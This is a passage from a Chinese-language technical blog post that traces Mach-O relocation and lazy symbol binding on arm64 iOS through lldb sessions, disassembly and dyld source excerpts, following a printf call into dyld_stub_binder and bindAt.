是参数，w10是global_var的值，来自x9</p><p><code>w10  = [x9 + 0x68]</code> (未重定位修复）</p><p>最开始索引x9的时候可以发现是把0赋给了x9，因为这里还没有重定位，所以用0代替。</p><p>最终的产物中可以看到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000000100007f64         adrp       x9, <span class="comment">#0x100008000                            ; 0x100008000@PAGE</span></span><br><span class="line">0000000100007f68         add        x9, x9, <span class="comment">#0x0                                ; 0x100008000@PAGEOFF, _global_var</span></span><br><span class="line">0000000100007f6c         ldr        w10, [x9]                                   ; _global_var</span><br><span class="line">0000000100007f70         add        w0, w10, <span class="comment">#0x2a</span></span><br><span class="line">0000000100007f74         str        w8, [sp, <span class="comment">#0x10 + var_C]</span></span><br><span class="line">0000000100007f78         bl         _foo</span><br></pre></td></tr></table></figure><p>把0替换成了 0x100008000，这个地址恰好指向global_var。</p><p>可以看到经过linker的处理，可以正确找到global_var，符号foo同理</p><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><h2 id="debug-set-up"><a href="#debug-set-up" class="headerlink" title="debug set up"></a>debug set up</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.18.24@2x.png" alt="CleanShot 2021-07-20 at 15.18.24@2x"></p><p>应该是签名有问题，最终解决方案：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/security find-identity -v -p codesigning</span><br><span class="line"># get : A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455</span><br><span class="line"></span><br><span class="line">codesign -s "A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455" --entitlements entitlements.xml -f libFoo.dylib</span><br><span class="line">codesign -s "A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455" --entitlements entitlements.xml -f main</span><br><span class="line"></span><br><span class="line"># scp ....</span><br><span class="line"># ssh ....</span><br><span class="line">mude-iPhone:/tmp root# ./main</span><br><span class="line">magic is : 4919</span><br><span class="line">4920</span><br></pre></td></tr></table></figure><h2 id="debug-lazy-binding-process"><a href="#debug-lazy-binding-process" class="headerlink" title="debug lazy binding process"></a>debug lazy binding process</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.19.30@2x.png" alt="CleanShot 2021-07-20 at 15.19.30@2x"></p><p>可以看到，第一次调用 <code>printf</code>的时候，bl跳过去并不是 printf函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue &#x3D; &#39;com.apple.main-thread&#39;, stop reason &#x3D; instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf7c main</span><br><span class="line">-&gt;  0x10089bf7c: br     x16</span><br><span class="line">    0x10089bf80: ldr    w16, 0x10089bf88</span><br><span class="line">    0x10089bf84: b      0x10089bf68</span><br><span class="line">    0x10089bf88: udf    #0x0</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 &#x3D; 0x00000001d858080c  libdyld.dylib&#96;dyld_stub_binder</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 &#x3D; 0x000000010089bfa4  &quot;magic is : %d\n&quot;</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 &#x3D; 0x0000000000001337</span><br></pre></td></tr></table></figure><p>通过 <code>dyld_stub_binder</code> 找 <code>printf</code>的地址，把找到的地址写回到 <code>DATA,__la_symbol_ptr</code></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.20.15@2x.png" alt="CleanShot 2021-07-20 at 15.20.15@2x"></p><p>第二次调用printf的时候就可以看到，这个地方printf函数地址已经被写过来了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x/10i <span class="variable">$pc</span></span><br><span class="line">-&gt;  0x100dcff60: 0x58000610   ldr    x16, <span class="comment">#0xc0                ; (void *)0x00000001d860e14c: printf</span></span><br><span class="line">    0x100dcff64: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff68: 0x10000611   adr    x17, <span class="comment">#0xc0                ; _dyld_private</span></span><br><span class="line">    0x100dcff6c: 0xd503201f   nop</span><br><span class="line">    0x100dcff70: 0xa9bf47f0   stp    x16, x17, [sp, <span class="comment">#-0x10]!</span></span><br><span class="line">    0x100dcff74: 0xd503201f   nop</span><br><span class="line">    0x100dcff78: 0x58000490   ldr    x16, <span class="comment">#0x90                ; (void *)0x00000001d858080c: dyld_stub_binder</span></span><br><span class="line">    0x100dcff7c: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff80: 0x18000050   ldr    w16, 0x100dcff88</span><br><span class="line">    0x100dcff84: 0x17fffff9   b      0x100dcff68</span><br><span class="line">(lldb) x/3i <span class="variable">$pc</span></span><br><span class="line">-&gt;  0x100dcff60: 0x58000610   ldr    x16, <span class="comment">#0xc0                ; (void *)0x00000001d860e14c: printf</span></span><br><span class="line">    0x100dcff64: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff68: 0x10000611   adr    x17, <span class="comment">#0xc0                ; _dyld_private</span></span><br><span class="line">(lldb) x/gx <span class="variable">$pc</span>+0xc0</span><br><span class="line">0x100dd0020: 0x00000001d860e14c</span><br><span class="line">(lldb) memory region 0x00000001d860e14c</span><br></pre></td></tr></table></figure><p>所以这里就可以直接获取到地址，然后直接跳转过去就行:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf60 main`printf + 4</span><br><span class="line">main`printf:</span><br><span class="line">-&gt;  0x10089bf60 <span class="tag">&lt;<span class="name">+4</span>&gt;</span>: ldr    x16, #0xc0                ; (void *)0x00000001d860e14c: printf</span><br><span class="line">    0x10089bf64 <span class="tag">&lt;<span class="name">+8</span>&gt;</span>: br     x16</span><br><span class="line">    0x10089bf68:      adr    x17, #0xc0                ; _dyld_private</span><br><span class="line">    0x10089bf6c:      nop</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf64 main`printf + 8</span><br><span class="line">main`printf:</span><br><span class="line">-&gt;  0x10089bf64 <span class="tag">&lt;<span class="name">+8</span>&gt;</span>: br     x16</span><br><span class="line">    0x10089bf68:      adr    x17, #0xc0                ; _dyld_private</span><br><span class="line">    0x10089bf6c:      nop</span><br><span class="line">    0x10089bf70:      stp    x16, x17, [sp, #-0x10]!</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 = 0x00000001d860e14c  libsystem_c.dylib`printf</span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><h2 id="libdyld-dylib-dyld-stub-binder"><a href="#libdyld-dylib-dyld-stub-binder" class="headerlink" title="libdyld.dylib`dyld_stub_binder"></a>libdyld.dylib`dyld_stub_binder</h2><p>dyld-852的代码：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.20.35@2x.png" alt="CleanShot 2021-07-20 at 15.20.35@2x"></p><p>因为我目标环境是iOS12.2，所以具体汇编代码有一些差别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) x&#x2F;30i $pc</span><br><span class="line">-&gt;  0x1d858080c: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!</span><br><span class="line">    0x1d8580810: 0x910003fd   mov    x29, sp</span><br><span class="line">    0x1d8580814: 0xd103c3ff   sub    sp, sp, #0xf0             ; &#x3D;0xf0</span><br><span class="line">    0x1d8580818: 0xa93f07a0   stp    x0, x1, [x29, #-0x10]</span><br><span class="line">    0x1d858081c: 0xa93e0fa2   stp    x2, x3, [x29, #-0x20]</span><br><span class="line">    0x1d8580820: 0xa93d17a4   stp    x4, x5, [x29, #-0x30]</span><br><span class="line">    0x1d8580824: 0xa93c1fa6   stp    x6, x7, [x29, #-0x40]</span><br><span class="line">    0x1d8580828: 0xa93b27a8   stp    x8, x9, [x29, #-0x50]</span><br><span class="line">    0x1d858082c: 0xad3c07a0   stp    q0, q1, [x29, #-0x80]</span><br><span class="line">    0x1d8580830: 0xad3b0fa2   stp    q2, q3, [x29, #-0xa0]</span><br><span class="line">    0x1d8580834: 0xad3a17a4   stp    q4, q5, [x29, #-0xc0]</span><br><span class="line">    0x1d8580838: 0xad391fa6   stp    q6, q7, [x29, #-0xe0]</span><br><span class="line">    0x1d858083c: 0xf9400fa0   ldr    x0, [x29, #0x18]</span><br><span class="line">    0x1d8580840: 0xf9400ba1   ldr    x1, [x29, #0x10]</span><br><span class="line">    0x1d8580844: 0x940004e4   bl     0x1d8581bd4               ; _dyld_fast_stub_entry(void*, long)</span><br><span class="line">    0x1d8580848: 0xaa0003f0   mov    x16, x0</span><br><span class="line">    0x1d858084c: 0xa97f07a0   ldp    x0, x1, [x29, #-0x10]</span><br><span class="line">    0x1d8580850: 0xa97e0fa2   ldp    x2, x3, [x29, #-0x20]</span><br><span class="line">    0x1d8580854: 0xa97d17a4   ldp    x4, x5, [x29, #-0x30]</span><br><span class="line">    0x1d8580858: 0xa97c1fa6   ldp    x6, x7, [x29, #-0x40]</span><br><span class="line">    0x1d858085c: 0xa97b27a8   ldp    x8, x9, [x29, #-0x50]</span><br><span class="line">    0x1d8580860: 0xad7c07a0   ldp    q0, q1, [x29, #-0x80]</span><br><span class="line">    0x1d8580864: 0xad7b0fa2   ldp    q2, q3, [x29, #-0xa0]</span><br><span class="line">    0x1d8580868: 0xad7a17a4   ldp    q4, q5, [x29, #-0xc0]</span><br><span class="line">    0x1d858086c: 0xad791fa6   ldp    q6, q7, [x29, #-0xe0]</span><br><span class="line">    0x1d8580870: 0x910003bf   mov    sp, x29</span><br><span class="line">    0x1d8580874: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10</span><br><span class="line">    0x1d8580878: 0x910043ff   add    sp, sp, #0x10             ; &#x3D;0x10</span><br><span class="line">    0x1d858087c: 0xd61f0200   br     x16</span><br><span class="line">    0x1d8580880: 0xd10103ff   sub    sp, sp, #0x40             ; &#x3D;0x40</span><br></pre></td></tr></table></figure><p>但是本质上是差不多的，影响不大。</p><p>下面看看怎么一步一步调用进去，找到所需要的符号</p><h3 id="1-call-dyld-stub-binder"><a href="#1-call-dyld-stub-binder" class="headerlink" title="1.  call dyld_stub_binder"></a>1.  call dyld_stub_binder</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0000000100007f98         ldr        w16, &#x3D;0x6967616d0000001a</span><br><span class="line">0000000100007f9c         b          0x100007f68</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">0000000100007f68         adr        x17, #0x100008028                           ; CODE XREF&#x3D;0x100007f84, 0x100007f90, 0x100007f9c</span><br><span class="line">&#x2F;&#x2F; x17-&gt; _dyld_private</span><br><span class="line"></span><br><span class="line">0000000100007f6c         nop</span><br><span class="line">0000000100007f70         stp        x16, x17, [sp, #-0x10]!</span><br><span class="line"></span><br><span class="line">0000000100007f74         nop</span><br><span class="line">0000000100007f78         ldr        x16, #dyld_stub_binder_100008008</span><br><span class="line"></span><br><span class="line">0000000100007f7c         br         x16 &#x2F;&#x2F; call dyld_stub_binder</span><br></pre></td></tr></table></figure><p>个人猜测：<code>0x000000000000001a</code> 应该是 类似 linux下elf lazy binding的时候那个index参数的东西，每个符号都不一样 。</p><p>初始化好需要的参数就调用进去dyld中去做符号绑定操作了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) s</span><br><span class="line">Process 1465 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = 'com.apple.main-thread', stop reason = instruction step into</span></span><br><span class="line">    frame <span class="comment">#0: 0x0000000100fb7f7c main</span></span><br><span class="line">-&gt;  0x100fb7f7c: br     x16</span><br><span class="line">    0x100fb7f80: ldr    w16, 0x100fb7f88</span><br><span class="line">    0x100fb7f84: b      0x100fb7f68</span><br><span class="line">    0x100fb7f88: udf    <span class="comment">#0x0</span></span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 = 0x00000001d858080c  libdyld.dylib`dyld_stub_binder</span><br><span class="line">(lldb) x/10gx <span class="variable">$sp</span></span><br><span class="line">0x16ee4f5a0: 0x000000000000001a 0x0000000100fb8028</span><br><span class="line">0x16ee4f5b0: 0x0000000000001337 0x0000000000000000</span><br><span class="line">0x16ee4f5c0: 0x0000000000000000 0x0000000000000001</span><br><span class="line">0x16ee4f5d0: 0x000000016ee4f5f0 0x00000001d857e8e0</span><br><span class="line">0x16ee4f5e0: 0x00000001d857e8e0 0x0000000000000000</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = 0x0000000100fb7fa4  <span class="string">"magic is : %d\n"</span></span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = 0x0000000000001337</span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = 0x00000000000120a8</span><br></pre></td></tr></table></figure><h3 id="2-call-dyld-fastBindLazySymbol-loadercache-lazyinfo"><a href="#2-call-dyld-fastBindLazySymbol-loadercache-lazyinfo" class="headerlink" title="2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)"></a>2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)</h3><p>保存栈帧，保存当前的寄存器信息(一大堆stp指令，后面符号绑定完成后，ldp会恢复，这些是成对的)，然后设置好参数，就直接转到 <code>dyld::fastBindLazySymbol</code></p><p>（函数前面的保存操作看起来和x86上函数开头的保存栈帧 抬高栈給临时变量预留空间的操作差不多）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Process 1465 resuming</span><br><span class="line">Process 1465 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1</span></span><br><span class="line">    frame <span class="comment">#0: 0x00000001d8580844 libdyld.dylib`dyld_stub_binder + 56</span></span><br><span class="line">libdyld.dylib`dyld_stub_binder:</span><br><span class="line">-&gt;  0x1d8580844 &lt;+56&gt;: bl     0x1d8581bd4               ; _dyld_fast_stub_entry(void*, long)</span><br><span class="line">    0x1d8580848 &lt;+60&gt;: mov    x16, x0</span><br><span class="line">    0x1d858084c &lt;+64&gt;: ldp    x0, x1, [x29, <span class="comment">#-0x10]</span></span><br><span class="line">    0x1d8580850 &lt;+68&gt;: ldp    x2, x3, [x29, <span class="comment">#-0x20]</span></span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = 0x0000000100fb8028  _dyld_private</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = 0x000000000000001a</span><br></pre></td></tr></table></figure><p>调用的是 : <code>fastBindLazySymbol(0x0000000100fb8028, 0x1a)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  LINK_EDIT seg</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> start = fLinkEditBase + fDyldInfo-&gt;lazy_bind_off;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">end</span> = &amp;start[fDyldInfo-&gt;lazy_bind_size];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! getLazyBindingInfo(lazyBindingInfoOffset, start, <span class="built_in">end</span>, &amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind) )</span><br><span class="line">            dyld::throwf(<span class="string">"bad lazy bind info"</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span> (!doneAfterBind &amp;&amp; !context.strictMachORequired);</span><br></pre></td></tr></table></figure><p>对应汇编中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(lldb) c</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> resuming</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.1</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5e6c</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">136</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5e6c</span> &lt;+<span class="number">136</span>&gt;: bl     <span class="number">0x100fe1d98</span>               ; ImageLoaderMachO::getLazyBindingInfo(<span class="keyword">unsigned</span> <span class="keyword">int</span>&amp;, <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">unsigned</span> <span class="keyword">char</span>*, <span class="keyword">unsigned</span> <span class="keyword">long</span>*, <span class="keyword">int</span>*, <span class="keyword">char</span> <span class="keyword">const</span>**, <span class="keyword">bool</span>*)</span><br><span class="line">    <span class="number">0x100fe5e70</span> &lt;+<span class="number">140</span>&gt;: tbz    w0, #<span class="number">0x0</span>, <span class="number">0x100fe5f80</span>     ; &lt;+<span class="number">412</span>&gt;</span><br><span class="line">    <span class="number">0x100fe5e74</span> &lt;+<span class="number">144</span>&gt;: ldrb   w1, [sp, #<span class="number">0x43</span>]</span><br><span class="line">    <span class="number">0x100fe5e78</span> &lt;+<span class="number">148</span>&gt;: ldrb   w8, [x20, #<span class="number">0x74</span>]</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = <span class="number">0x0000000100fbc030</span></span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = <span class="number">0x0000000100fbc058</span></span><br><span class="line">(lldb) memory region <span class="number">0x0000000100fbc030</span></span><br><span class="line">[<span class="number">0x0000000100fbc000</span><span class="number">-0x0000000100fc0000</span>) r-- __LINKEDIT</span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>这里用到了 我这个可执行文件的LINK_EDIT 段去做符号绑定工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(lldb) <span class="built_in">image</span> lookup -va $x1</span><br><span class="line">      Address: main[<span class="number">0x000000010000c030</span>] (main.__LINKEDIT + <span class="number">48</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">"/private/var/tmp/main"</span>, arch = <span class="string">"arm64"</span></span><br></pre></td></tr></table></figure><h3 id="3-ImageLoaderMachO-getLazyBindingInfo"><a href="#3-ImageLoaderMachO-getLazyBindingInfo" class="headerlink" title="3. ImageLoaderMachO::getLazyBindingInfo"></a>3. ImageLoaderMachO::getLazyBindingInfo</h3><p>根据不同的opcode，走不同分支：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( lazyBindingInfoOffset &gt; (lazyInfoEnd-lazyInfoStart) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">bool</span> done = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span>* p = &amp;lazyInfoStart[lazyBindingInfoOffset];</span><br><span class="line">    <span class="keyword">while</span> ( !done &amp;&amp; (p &lt; lazyInfoEnd) ) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> immediate = *p &amp; BIND_IMMEDIATE_MASK;</span><br><span class="line">        <span class="keyword">uint8_t</span> opcode = *p &amp; BIND_OPCODE_MASK;</span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>获取目标符号相关的信息 :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind</span><br></pre></td></tr></table></figure><p>然后根据这些信息，获取该符号的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uintptr_t</span> address = segActualLoadAddress(segIndex) + segOffset;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dyld版本不一致，实现的函数有些差别，但是本质是一样的</span></span><br><span class="line">(lldb) n</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5ee4</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">256</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5ee4</span> &lt;+<span class="number">256</span>&gt;: mov    x26, x0</span><br><span class="line">    <span class="number">0x100fe5ee8</span> &lt;+<span class="number">260</span>&gt;: mov    x0, x20</span><br><span class="line">    <span class="number">0x100fe5eec</span> &lt;+<span class="number">264</span>&gt;: bl     <span class="number">0x100fe1fb0</span>               ; ImageLoaderMachO::imageBaseAddress() <span class="keyword">const</span></span><br><span class="line">    <span class="number">0x100fe5ef0</span> &lt;+<span class="number">268</span>&gt;: mov    x1, x0</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = <span class="number">0x00000001d860e14c</span>  libsystem_c.dylib`<span class="built_in">printf</span></span><br></pre></td></tr></table></figure><p>执行符号绑定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = bindAt(context, <span class="keyword">this</span>, address, BIND_TYPE_POINTER, symbolName, <span class="number">0</span>, <span class="number">0</span>, libraryOrdinal,<span class="literal">NULL</span>, <span class="string">"lazy "</span>, patcher, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调试：</span></span><br><span class="line">frame #<span class="number">0</span>: <span class="number">0x0000000100fe5f28</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">324</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5f28</span> &lt;+<span class="number">324</span>&gt;: bl     <span class="number">0x100fe0664</span>               ; ImageLoaderMachO::bindLocation(ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">char</span>, <span class="keyword">char</span> <span class="keyword">const</span>*, <span 